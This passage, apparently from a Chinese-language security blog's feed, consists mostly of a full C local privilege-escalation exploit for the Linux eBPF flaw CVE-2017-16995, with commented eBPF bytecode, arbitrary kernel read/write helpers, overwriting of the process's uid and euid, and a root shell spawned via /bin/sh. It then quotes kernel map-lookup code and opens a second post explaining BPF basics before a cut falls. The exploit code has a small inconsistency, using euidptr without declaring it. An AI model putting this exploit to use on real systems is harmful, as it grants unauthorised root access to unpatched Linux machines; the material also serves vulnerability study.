class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Tested on:</span></span><br><span class="line"><span class="comment">// Linux 4.5.0 #0 SMP x86_64 GNU/Linux</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHYS_OFFSET 0xffff880000000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_OFFSET 0x9f8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID_OFFSET 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EUID_OFFSET 20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_BUF_SIZE 65536</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROGSIZE 328</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sockets[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> mapfd, progfd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *__prog =     </span><br><span class="line">        <span class="string">&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;</span></span><br><span class="line">        <span class="string">&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;</span></span><br><span class="line">        <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">        <span class="string">&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">        <span class="string">&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">        <span class="string">&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bpf_log_buf[LOG_BUF_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载bpf指令至内核</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">enum</span> bpf_prog_type prog_type,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">const</span> struct bpf_insn *insns, <span class="keyword">int</span> prog_len,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">const</span> <span class="keyword">char</span> *license, <span class="keyword">int</span> kern_version)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .prog_type = prog_type,</span><br><span class="line">        .insns = (__u64)insns,</span><br><span class="line">        .insn_cnt = prog_len / <span class="keyword">sizeof</span>(struct bpf_insn),</span><br><span class="line">        .license = (__u64)license,</span><br><span class="line">        .log_buf = (__u64)bpf_log_buf,</span><br><span class="line">        .log_size = LOG_BUF_SIZE,</span><br><span class="line">        .log_level = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    attr.kern_version = kern_version;</span><br><span class="line"></span><br><span class="line">    bpf_log_buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 申请map</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_create_map</span><span class="params">(<span class="keyword">enum</span> bpf_map_type map_type, <span class="keyword">int</span> key_size, <span class="keyword">int</span> value_size,</span></span></span><br><span class="line"><span class="function"><span class="params">           <span class="keyword">int</span> max_entries)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_type = map_type,</span><br><span class="line">        .key_size = key_size,</span><br><span class="line">        .value_size = value_size,</span><br><span class="line">        .max_entries = max_entries</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新map中元素的值</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_update_elem</span><span class="params">(<span class="keyword">uint64_t</span> key, <span class="keyword">uint64_t</span> value)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = mapfd,</span><br><span class="line">        .key = (__u64)&amp;key,</span><br><span class="line">        .value = (__u64)&amp;value,</span><br><span class="line">        .flags = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取map中元素的值</span></span><br><span class="line"><span class="comment">// 这里需要区别BPF_MAP_LOOKUP_ELEM这个系统调用和我们在bpf指令中调用的BPF_FUNC_map_lookup_elem这两者的区别</span></span><br><span class="line"><span class="comment">// 实际上他们的调用基本上是一致的，但是BPF_FUNC_map_lookup_elem得到的是元素的指针，而BPF_MAP_LOOKUP_ELEM在得到元素的指针后，会调用copy_to_user这个函数来讲指针指向的元素值赋值回value</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_lookup_elem</span><span class="params">(<span class="keyword">void</span> *key, <span class="keyword">void</span> *value)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = mapfd,</span><br><span class="line">        .key = (__u64)key,</span><br><span class="line">        .value = (__u64)value,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __exit(<span class="keyword">char</span> *err) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;error: %s\n&quot;</span>, err);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prep</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>), <span class="number">3</span>);  <span class="comment">// 申请一个长度为3的map</span></span><br><span class="line">    <span class="keyword">if</span> (mapfd &lt; <span class="number">0</span>)</span><br><span class="line">        __exit(strerror(errno));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;map fd is %d\n&quot;</span>,mapfd);</span><br><span class="line">    progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">            (struct bpf_insn *)__prog, PROGSIZE, <span class="string">&quot;GPL&quot;</span>, <span class="number">0</span>);                  <span class="comment">// 将我们的payload加载入内核</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (progfd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        __exit(strerror(errno));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sockets))     <span class="comment">// 创建socket，用于触发内核执行我们的payload</span></span><br><span class="line">        __exit(strerror(errno));</span><br><span class="line">    <span class="keyword">if</span>(setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(progfd)) &lt; <span class="number">0</span>)</span><br><span class="line">        __exit(strerror(errno));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向socket中写入数据，仅为了触发内核执行我们的bpf代码</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">writemsg</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">ssize_t</span> n = write(sockets[<span class="number">0</span>], buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (n != <span class="keyword">sizeof</span>(buffer))</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short write: %lu\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义map中各项的值</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __update_elem(a, b, c) \</span></span><br><span class="line">    bpf_update_elem(<span class="number">0</span>, (a)); \</span><br><span class="line">    bpf_update_elem(<span class="number">1</span>, (b)); \</span><br><span class="line">    bpf_update_elem(<span class="number">2</span>, (c)); \</span><br><span class="line">    writemsg();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试获取map中指定key的value</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint64_t</span> <span class="title">get_value</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bpf_lookup_elem(&amp;key, &amp;value))</span><br><span class="line">        __exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试获得内核栈地址</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __get_fp(<span class="keyword">void</span>) &#123;</span><br><span class="line">    __update_elem(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试任意地址读</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __read(<span class="keyword">uint64_t</span> addr) &#123;</span><br><span class="line">    __update_elem(<span class="number">0</span>, addr, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试任意地址写</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __write(<span class="keyword">uint64_t</span> addr, <span class="keyword">uint64_t</span> val) &#123;</span><br><span class="line">    __update_elem(<span class="number">2</span>, addr, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试获得rsp地址，也即存储task_struct地址的地址</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint64_t</span> <span class="title">get_sp</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ~(<span class="number">0x4000</span> - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pwn</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> fp, sp, task_struct, credptr, uidptr,gidptr;</span><br><span class="line"></span><br><span class="line">    fp = __get_fp(); <span class="comment">// 得到rbp的值</span></span><br><span class="line">    <span class="keyword">if</span> (fp &lt; PHYS_OFFSET)</span><br><span class="line">        __exit(<span class="string">&quot;bogus fp&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    sp = get_sp(fp); <span class="comment">// 得到内核栈顶rsp地址</span></span><br><span class="line">    <span class="keyword">if</span> (sp &lt; PHYS_OFFSET)</span><br><span class="line">        __exit(<span class="string">&quot;bogus sp&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    task_struct = __read(sp); <span class="comment">// 读出task_struct结构体的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (task_struct &lt; PHYS_OFFSET)</span><br><span class="line">        __exit(<span class="string">&quot;bogus task ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;task_struct = %lx\n&quot;</span>, task_struct);</span><br><span class="line"></span><br><span class="line">    credptr = __read(task_struct + CRED_OFFSET); <span class="comment">// 读出task_struct中cred结构体的地址</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (credptr &lt; PHYS_OFFSET)</span><br><span class="line">        __exit(<span class="string">&quot;bogus cred ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uidptr = credptr + UID_OFFSET; <span class="comment">// 得到uid的地址</span></span><br><span class="line">    <span class="keyword">if</span> (uidptr &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">&quot;bogus uid ptr&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;uidptr = %lx\n&quot;</span>, uidptr);</span><br><span class="line">  __write(uidptr, <span class="number">0</span>); <span class="comment">// 将uid以及gid置为0，注意这里写入的值为64位，uid+gid = 64bytes</span></span><br><span class="line"></span><br><span class="line">    euidptr = credptr + EUID_OFFSET;</span><br><span class="line">  <span class="keyword">if</span> (euidptr &lt; PHYS_OFFSET)</span><br><span class="line">  __exit(<span class="string">&quot;fake addr&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;euidptr = %lx\n&quot;</span>, euidptr);</span><br><span class="line">  __write(euidptr,<span class="number">0</span>);<span class="comment">// 将euid以及egid置为0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getuid() == <span class="number">0</span> &amp;&amp; geteuid() == <span class="number">0</span>) &#123; <span class="comment">// 此时该进程已经为root权限,注意在busybox环境下仅修改uid以及gid为0是无法提权的，在bash环境下则可以，详细可以看之后的文章</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;spawning root shell\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>); <span class="comment">// fork出“/bin/sh”，同样是root权限，提权成功</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __exit(<span class="string">&quot;not vulnerable?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    prep();</span><br><span class="line">    pwn();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外贴一份注释中提到的<code>BPF_MAP_LOOKUP_ELEM</code>的实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_lookup_elem</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> __user *ukey = u64_to_ptr(attr-&gt;key);</span><br><span class="line">    <span class="keyword">void</span> __user *uvalue = u64_to_ptr(attr-&gt;value);</span><br><span class="line">    <span class="keyword">int</span> ufd = attr-&gt;map_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *key, *value, *ptr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (CHECK_ATTR(BPF_MAP_LOOKUP_ELEM))</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    f = fdget(ufd);</span><br><span class="line">    <span class="built_in">map</span> = __bpf_map_get(f);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">    err = -ENOMEM;</span><br><span class="line">    key = kmalloc(<span class="built_in">map</span>-&gt;key_size, GFP_USER);</span><br><span class="line">    <span class="keyword">if</span> (!key)</span><br><span class="line">        <span class="keyword">goto</span> err_put;</span><br><span class="line"></span><br><span class="line">    err = -EFAULT;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(key, ukey, <span class="built_in">map</span>-&gt;key_size) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> free_key;</span><br><span class="line"></span><br><span class="line">    err = -ENOMEM;</span><br><span class="line">    value = kmalloc(<span class="built_in">map</span>-&gt;value_size, GFP_USER | __GFP_NOWARN);</span><br><span class="line">    <span class="keyword">if</span> (!value)</span><br><span class="line">        <span class="keyword">goto</span> free_key;</span><br><span class="line"></span><br><span class="line">    rcu_read_lock();</span><br><span class="line">    ptr = <span class="built_in">map</span>-&gt;ops-&gt;map_lookup_elem(<span class="built_in">map</span>, key); <span class="comment">// 获得元素的指针</span></span><br><span class="line">    <span class="keyword">if</span> (ptr)</span><br><span class="line">        <span class="built_in">memcpy</span>(value, ptr, <span class="built_in">map</span>-&gt;value_size); <span class="comment">// 将元素值拷贝到内核value</span></span><br><span class="line">    rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">    err = -ENOENT;</span><br><span class="line">    <span class="keyword">if</span> (!ptr)</span><br><span class="line">        <span class="keyword">goto</span> free_value;</span><br><span class="line"></span><br><span class="line">    err = -EFAULT;</span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(uvalue, value, <span class="built_in">map</span>-&gt;value_size) != <span class="number">0</span>) <span class="comment">// 将内核value的值拷贝到用户提供的用户态下的value值中</span></span><br><span class="line">        <span class="keyword">goto</span> free_value;</span><br><span class="line"></span><br><span class="line">    err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">free_value:</span><br><span class="line">    kfree(value);</span><br><span class="line">free_key:</span><br><span class="line">    kfree(key);</span><br><span class="line">err_put:</span><br><span class="line">    fdput(f);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> binary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-16995 -- 触发</title>
      <link href="CVE-2017-16995-trigger.html"/>
      <url>CVE-2017-16995-trigger.html</url>
      
        <content type="html"><![CDATA[<p>CVE-2017-16995是基于ebpf机制的漏洞，漏洞点在于ebpf在虚拟执行时由于错误的符号拓展从而误判执行流程，导致了在实际执行过程中出现预期外的情况。</p><p>最近正好也在看内核的代码，所以秉着边分析边学的原则，来详细看看CVE-2017-16995的实现细节</p><p>本文参考了一些网上的资料，膜各位dl</p><h1 id="什么是bpf"><a href="#什么是bpf" class="headerlink" title="什么是bpf"></a>什么是bpf</h1><p>众所周知，linux的用户层和内核层是隔离的，想让内核执行用户的代码，正常是需要编写内核模块，当然内核模块只能root用户才能加载。而BPF则相当于是内核给用户开的一个绿色通道：BPF（Berkeley Packet Filter）提供了一个用户和内核之间代码和数据传输的桥梁。用户可以用eBPF指令字节码的形式向内核输送代码，并通过事件（如往socket写数据）来触发内核执行用户提供的代码；同时以map（key，value）的形式来和内核共享数据，用户层向map中写数据，内核层从map中取数据，反之亦然。BPF设计初衷是用来在底层对网络进行过滤，后续由于他可以方便的向内核注入代码，并且还提供了一套完整的安全措施来对内核进行保护，被广泛用于抓包、内核probe、性能监控等领域。BPF发展经历了2个阶段，cBPF（classic BPF）和eBPF（extend BPF），cBPF已退出历史舞台，后文提到的BPF默认为eBPF。</p><h1 id="bpf指令集"><a href="#bpf指令集" class="headerlink" title="bpf指令集"></a>bpf指令集</h1><p>bpf的指令集类似于虚拟机机制，拥有其单独的一套指令格式及语法</p><p>在bpf语法中一共有11个寄存器，分别一一对应机器上的11个物理寄存器，可以从下面看到，r9寄存器并没有被映射，所以bpf语法中函数最多只能有五个参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">R0 – rax</span><br><span class="line">R1 - rdi</span><br><span class="line">R2 - rsi</span><br><span class="line">R3 - rdx</span><br><span class="line">R4 - rcx</span><br><span class="line">R5 - r8</span><br><span class="line">R6 - rbx</span><br><span class="line">R7 - r13</span><br><span class="line">R8 - r14</span><br><span class="line">R9 - r15</span><br><span class="line">R10 – rbp（帧指针，frame pointer）</span><br></pre></td></tr></table></figure><p>每一条指令格式都如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> &#123;</span></span><br><span class="line">    __u8    code;       <span class="comment">/* opcode */</span></span><br><span class="line">    __u8    dst_reg:<span class="number">4</span>;  <span class="comment">/* dest register */</span></span><br><span class="line">    __u8    src_reg:<span class="number">4</span>;  <span class="comment">/* source register */</span></span><br><span class="line">    __s16   off;        <span class="comment">/* signed offset */</span></span><br><span class="line">    __s32   